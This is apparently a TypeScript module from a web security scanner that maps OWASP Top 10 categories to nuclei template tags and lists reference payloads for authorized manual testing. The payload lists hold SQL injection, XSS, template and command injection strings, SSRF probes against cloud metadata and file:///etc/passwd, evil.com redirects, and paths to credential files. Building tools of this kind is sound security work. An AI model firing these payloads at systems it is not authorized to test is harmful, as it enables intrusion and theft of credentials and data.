// OWASP Top 10 (2021) test catalog.
//
// The actual test engine is nuclei (installed in the image), driven by template
// tags — production-grade and safe, rather than a hand-rolled payload injector.
// Each category maps to nuclei tags and a `requires` set of app-profile flags:
// a category is APPLICABLE if `requires` is empty OR the domain's profile has at
// least one of those flags true. This implements "don't test IDOR if there's no
// login", etc. `payloads` is a small manual-testing reference shown in the UI.

export interface ProfileFlags {
  hasLogin?: boolean
  hasParams?: boolean
  hasUpload?: boolean
  hasApi?: boolean
  hasRedirects?: boolean
}

export const PROFILE_KEYS: { key: keyof ProfileFlags; label: string; hint: string }[] = [
  { key: 'hasLogin', label: 'Has login / auth', hint: 'Authentication, accounts, sessions' },
  { key: 'hasParams', label: 'Takes user input', hint: 'Search, query params, forms' },
  { key: 'hasUpload', label: 'File upload', hint: 'Avatar, document, import' },
  { key: 'hasApi', label: 'Has an API', hint: 'JSON/REST/GraphQL endpoints' },
  { key: 'hasRedirects', label: 'Redirects by param', hint: '?next=, ?url=, ?return=' },
]

export interface OwaspCategory {
  id: string
  name: string
  description: string
  tags: string[] // nuclei -tags
  requires: (keyof ProfileFlags)[] // applicable if empty or any is true
  payloads: string[] // manual-testing reference
}

// Per-category manual-testing reference payloads, curated from the OWASP /
// PayloadsAllTheThings knowledge base (github.com/swisskyrepo/PayloadsAllTheThings).
// These are reference strings shown in the UI for authorized manual testing —
// not an automated injection engine (nuclei templates do the automated work).
export const OWASP_CATALOG: OwaspCategory[] = [
  {
    id: 'A01',
    name: 'A01 Broken Access Control',
    description: 'IDOR, missing authz, forced browsing, privilege escalation.',
    tags: ['idor', 'auth-bypass', 'access', 'unauth'],
    requires: ['hasLogin', 'hasApi'],
    payloads: [
      '/admin · /admin/ · /administrator · /manage · /dashboard',
      'IDOR: /api/users/1 → /api/users/2 · ?id=1 → ?id=2 · ?account= · ?user_id=',
      '/api/v1/users/me → /api/v1/users/{otherId}',
      'Verb tampering: GET → POST / PUT / PATCH / DELETE on the same route',
      'Header override: X-Original-URL: /admin · X-Rewrite-URL: /admin',
      'Trusted IP spoof: X-Forwarded-For: 127.0.0.1 · X-Custom-IP-Authorization: 127.0.0.1',
      'Path traversal to bypass: /../ · /..;/ · /%2e%2e/ · /admin%00',
      'Role/claim tamper: cookie role=admin · JSON "isAdmin":true · JWT role claim',
    ],
  },
  {
    id: 'A02',
    name: 'A02 Cryptographic Failures',
    description: 'Weak TLS, sensitive data exposure, secrets in responses.',
    tags: ['ssl', 'tls', 'exposure', 'disclosure'],
    requires: [],
    payloads: [
      'Env/secret files: /.env · /.git/config · /.git/HEAD · /config.json · /config.php.bak',
      'Backups: /backup.zip · /backup.sql · /db.sql · /dump.sql · /www.zip',
      'Keys: /.aws/credentials · /.ssh/id_rsa · /id_rsa · /.npmrc',
      'Info leak: /phpinfo.php · /info.php · server banners · verbose stack traces',
      'Transport: mixed http:// on auth pages · missing HSTS · TLS 1.0/1.1 · weak ciphers',
      'Tokens/secrets reflected in URLs, JS bundles, or source maps (*.js.map)',
    ],
  },
  {
    id: 'A03',
    name: 'A03 Injection',
    description: 'SQLi, XSS, SSTI, command/template injection via inputs.',
    tags: ['sqli', 'xss', 'injection', 'ssti', 'cmdi'],
    requires: ['hasParams', 'hasApi'],
    payloads: [
      "SQLi: ' OR '1'='1 · ' OR 1=1-- · admin'-- · ' UNION SELECT NULL-- · \" OR \"\"=\"",
      "SQLi (time): 1' AND SLEEP(5)-- · '; WAITFOR DELAY '0:0:5'-- · ' || pg_sleep(5)--",
      'XSS: <script>alert(1)</script> · "><img src=x onerror=alert(1)> · \'"><svg/onload=alert(1)>',
      'XSS (attr/uri): " autofocus onfocus=alert(1) x=" · javascript:alert(1)',
      "SSTI: {{7*7}} · ${7*7} · #{7*7} · <%= 7*7 %> · {{7*'7'}} · ${{7*7}}",
      'Cmd injection: ;id · |id · `id` · $(id) · && whoami · %0aid · || ping -c1 x',
      'NoSQLi: {"$gt":""} · {"$ne":null} · \' || \'1\'==\'1 · admin\'||\'\'==\'',
      'LDAP: *)(uid=*))(|(uid=* · XPath: \' or \'1\'=\'1 · header CRLF: %0d%0aSet-Cookie:x=1',
    ],
  },
  {
    id: 'A04',
    name: 'A04 Insecure Design',
    description: 'Logic flaws (limited automated coverage).',
    tags: ['misconfig', 'logic'],
    requires: [],
    payloads: [
      'Rate-limit / brute-force bypass: rotate X-Forwarded-For, vary casing, add trailing dot',
      'Race conditions: concurrent coupon redeem, withdraw, vote, or signup',
      'Mass assignment: add "role":"admin" · "isAdmin":true · "verified":true to JSON body',
      'Price/quantity tampering: negative qty, decimal, currency swap, 0.00 total',
      'Flow bypass: skip steps, replay final-step request, reuse one-time tokens',
      'Business limits: coupon stacking, refund > paid, balance underflow',
    ],
  },
  {
    id: 'A05',
    name: 'A05 Security Misconfiguration',
    description: 'Default creds, debug endpoints, verbose errors, open dirs.',
    tags: ['misconfig', 'default-login', 'exposure', 'debug'],
    requires: [],
    payloads: [
      'Default creds: admin:admin · root:root · admin:password · tomcat:tomcat',
      'Status/debug: /server-status · /server-info · /actuator · /actuator/env · /actuator/heapdump',
      'Docs/consoles: /swagger-ui · /api-docs · /graphql · /console · /debug',
      'Methods: TRACE · OPTIONS · PUT (verb tampering, XST)',
      'Listings: /uploads/ · /backup/ · /.well-known/ · open S3/GCS buckets',
      'Missing headers: CSP · X-Frame-Options · X-Content-Type-Options · CORS *',
    ],
  },
  {
    id: 'A06',
    name: 'A06 Vulnerable & Outdated Components',
    description: 'Known CVEs in detected technologies/versions.',
    tags: ['cve', 'tech', 'wordpress', 'wp-plugin'],
    requires: [],
    payloads: [
      'Manifests: /package.json · /composer.lock · /yarn.lock · /Gemfile.lock',
      'Version markers: /CHANGELOG.md · /VERSION · /readme.html · X-Powered-By header',
      'WordPress: /wp-login.php · /wp-json/wp/v2/users · /wp-content/plugins/ · /readme.html',
      'Fingerprint banners (Server, X-AspNet-Version) and match to CVE feeds',
      'Cross-check the Exposure tab CVEs and run nuclei -tags cve',
    ],
  },
  {
    id: 'A07',
    name: 'A07 Identification & Auth Failures',
    description: 'Default/weak credentials, missing brute-force protection.',
    tags: ['default-login', 'weak-credentials', 'auth'],
    requires: ['hasLogin'],
    payloads: [
      'Default/weak creds: admin:admin · admin:password · admin:123456 · root:toor',
      'No lockout / throttling after N attempts (credential stuffing)',
      'Username enumeration: differing login & password-reset error messages/timing',
      'Sessions: predictable/short tokens · no rotation on login · fixation',
      'JWT: alg=none · weak HMAC secret · unverified kid/jku · no expiry check',
      'Reset flows: token reuse, no expiry, host-header poisoning of reset link',
    ],
  },
  {
    id: 'A08',
    name: 'A08 Software & Data Integrity',
    description: 'Insecure deserialization, unsigned updates, CI/CD exposure.',
    tags: ['deserialization', 'exposure'],
    requires: ['hasUpload', 'hasApi'],
    payloads: [
      'CI/CD leak: /.github/workflows/ · /.gitlab-ci.yml · /Jenkinsfile · /.circleci/config.yml',
      'Java deserialization: base64 starting rO0AB... (ysoserial gadget chains)',
      'Python pickle / unsafe YAML: !!python/object/apply · PHP unserialize O:',
      'Build artifacts: /webpack.config.js · source maps /*.js.map · exposed .map',
      'Unsigned/auto-update endpoints; integrity (SRI) missing on third-party scripts',
    ],
  },
  {
    id: 'A10',
    name: 'A10 Server-Side Request Forgery',
    description: 'SSRF via URL/redirect/import params.',
    tags: ['ssrf', 'redirect'],
    requires: ['hasParams', 'hasApi', 'hasRedirects'],
    payloads: [
      'Cloud metadata: ?url=http://169.254.169.254/latest/meta-data/ (AWS)',
      'GCP: ?url=http://metadata.google.internal/computeMetadata/v1/ (Metadata-Flavor: Google)',
      'Localhost: http://127.0.0.1:80/ · http://[::1]/ · http://localhost/admin',
      'Open redirect / SSRF: ?next=//evil.com · ?redirect=http://evil.com · ?dest=',
      'Schemes: file:///etc/passwd · gopher:// · dict:// · ftp://',
      'Filter bypass: http://2130706433/ (decimal IP) · http://127.0.0.1.nip.io · user@host: http://expected@evil.com',
    ],
  },
]

export function applicableCategories(profile: ProfileFlags): OwaspCategory[] {
  return OWASP_CATALOG.filter(
    (c) => c.requires.length === 0 || c.requires.some((k) => profile[k] === true),
  )
}

export function tagsForCategories(ids: string[]): string[] {
  const set = new Set<string>()
  for (const c of OWASP_CATALOG) {
    if (ids.includes(c.id)) for (const t of c.tags) set.add(t)
  }
  return [...set]
}
